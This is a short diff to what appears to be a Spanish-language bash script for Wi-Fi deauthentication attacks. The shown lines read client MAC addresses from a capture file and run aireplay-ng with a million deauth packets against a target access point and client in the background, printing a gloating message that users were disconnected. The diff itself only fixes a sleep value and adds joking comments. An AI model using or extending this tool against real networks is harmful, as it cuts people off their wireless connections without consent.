@@ -61,7 +61,7 @@ resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
 	direccion=$(cat captura-01.csv | tail -n $lineas | cut -b 1-17 | head -n 1)
 	sudo aireplay-ng --deauth 1000000  -a $victima -c $direccion $interface &>/dev/null&
 	else
-	sleep 
+	sleep 1
         printf "${redColour}[>:)]${endColour}${grayColour} Los usuarios fueron desautenticados ${endColour}\n"
         sleep 1
 	printf "${redColour}[>:)]${endColour}${grayColour} Presione ctrl + c para salir cuando lo desee ${endColour}\n"
@@ -141,3 +141,5 @@ sleep 1
 inicio
 dependencias
 #---------------------
+#  No leas mi codigo !! >:V
+#  Na leelo tranqui xd
